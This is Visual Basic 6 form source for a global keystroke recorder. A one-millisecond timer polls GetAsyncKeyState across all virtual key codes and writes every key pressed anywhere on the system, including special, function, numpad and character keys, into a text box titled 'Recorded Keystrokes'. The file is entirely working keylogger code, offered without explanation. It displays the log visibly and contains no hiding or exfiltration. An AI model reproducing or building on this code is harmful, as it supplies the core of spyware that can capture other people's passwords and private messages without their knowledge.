VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Recorded Keystrokes"
   ClientHeight    =   2295
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   2295
   ScaleWidth      =   4680
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   2760
      Top             =   2640
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2295
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      TabStop         =   0   'False
      Top             =   0
      Width           =   4695
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   4200
      Top             =   2400
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private KeyLoop As Long
Private FoundKeys As String
Private KeyResult As Long



Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer


Public Sub Form_Load()
LastKey = ""
TimeOut = 0
End Sub

Private Sub Timer1_Timer()
    Dim AddKey

    
   KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey = "[ENTER]"
        GoTo KeyFound
    End If

    KeyResult = GetAsyncKeyState(17)
    If KeyResult = -32767 Then
        AddKey = "[CTRL]"
        GoTo KeyFound
    End If
   
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        AddKey = "[BKSPACE]"
        GoTo KeyFound
    End If
   
    KeyResult = GetAsyncKeyState(9)
    If KeyResult = -32767 Then
        AddKey = "[TAB]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(18)
    If KeyResult = -32767 Then
        AddKey = "[ALT]"
        GoTo KeyFound
    End If
   
    KeyResult = GetAsyncKeyState(19)
    If KeyResult = -32767 Then
        AddKey = "[PAUSE]"
        GoTo KeyFound
    End If
   
    KeyResult = GetAsyncKeyState(20)
    If KeyResult = -32767 Then
        AddKey = "[CAPS]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(27)
    If KeyResult = -32767 Then
        AddKey = "[ESC]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(33)
    If KeyResult = -32767 Then
        AddKey = "[PGUP]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(34)
    If KeyResult = -32767 Then
        AddKey = "[PGDN]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(35)
    If KeyResult = -32767 Then
        AddKey = "[END]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(36)
    If KeyResult = -32767 Then
        AddKey = "[HOME]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(44)
    If KeyResult = -32767 Then
        AddKey = "[SYSRQ]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(45)
    If KeyResult = -32767 Then
        AddKey = "[INS]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(46)
    If KeyResult = -32767 Then
        AddKey = "[DEL]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(144)
    If KeyResult = -32767 Then
        AddKey = "[NUM]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(37)
    If KeyResult = -32767 Then
        AddKey = "[LEFT]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(38)
    If KeyResult = -32767 Then
        AddKey = "[UP]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(39)
    If KeyResult = -32767 Then
        AddKey = "[RIGHT]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(40)
    If KeyResult = -32767 Then
        AddKey = "[DOWN]"
        GoTo KeyFound
    End If
    
'------------FUNCTION KEYS

KeyResult = GetAsyncKeyState(112)
    If KeyResult = -32767 Then
        AddKey = "[F1]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(113)
    If KeyResult = -32767 Then
        AddKey = "[F2]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(114)
    If KeyResult = -32767 Then
        AddKey = "[F3]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(115)
    If KeyResult = -32767 Then
        AddKey = "[F4]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(116)
    If KeyResult = -32767 Then
        AddKey = "[F5]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(117)
    If KeyResult = -32767 Then
        AddKey = "[F6]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(118)
    If KeyResult = -32767 Then
        AddKey = "[F7]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(119)
    If KeyResult = -32767 Then
        AddKey = "[F8]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(120)
    If KeyResult = -32767 Then
        AddKey = "[F9]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(121)
    If KeyResult = -32767 Then
        AddKey = "[F10]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(122)
    If KeyResult = -32767 Then
        AddKey = "[F11]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(123)
    If KeyResult = -32767 Then
        AddKey = "[F12]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(124)
    If KeyResult = -32767 Then
        AddKey = "[F13]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(125)
    If KeyResult = -32767 Then
        AddKey = "[F14]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(126)
    If KeyResult = -32767 Then
        AddKey = "[F15]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(127)
    If KeyResult = -32767 Then
        AddKey = "[F16]"
        GoTo KeyFound
    End If
    
'------------SEPCIAL KEYS

KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        AddKey = ";"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        AddKey = "="
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        AddKey = ","
        GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        AddKey = "-"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        AddKey = "."
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        AddKey = "/" '/
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        AddKey = "`" '`
        GoTo KeyFound
    End If
     


'----------NUM PAD
KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        AddKey = "0"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        AddKey = "1"
        GoTo KeyFound
    End If
     

KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        AddKey = "2"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        AddKey = "3"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        AddKey = "4"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        AddKey = "5"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        AddKey = "6"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        AddKey = "7"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        AddKey = "8"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        AddKey = "9"
        GoTo KeyFound
    End If
       
    
KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        AddKey = "*"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        AddKey = "+"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        AddKey = "[ENTER]"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        AddKey = "-"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        AddKey = "."
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        AddKey = "/"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        AddKey = "\"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        AddKey = "'"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        AddKey = "]"
        
        
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(219) '219
    If KeyResult = -32767 Then
        AddKey = "["
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(16) '219
    If KeyResult = -32767 And TimeOut = 0 Then
        AddKey = "[SHIFT]"
        LastKey = AddKey
        TimeOut = 1
        GoTo KeyFound
        End If
Skip:
    KeyLoop = 41

    Do Until KeyLoop = 256 ' otherwise check For numbers and letters
        KeyResult = GetAsyncKeyState(KeyLoop)
        If KeyResult = -32767 Then Text1.Text = Text1.Text + Chr(KeyLoop)
        KeyLoop = KeyLoop + 1
    Loop
    LastKey = AddKey
    Exit Sub
KeyFound:



Text1 = Text1 & AddKey
End Sub

Private Sub Timer2_Timer()
TimeOut = 0
End Sub
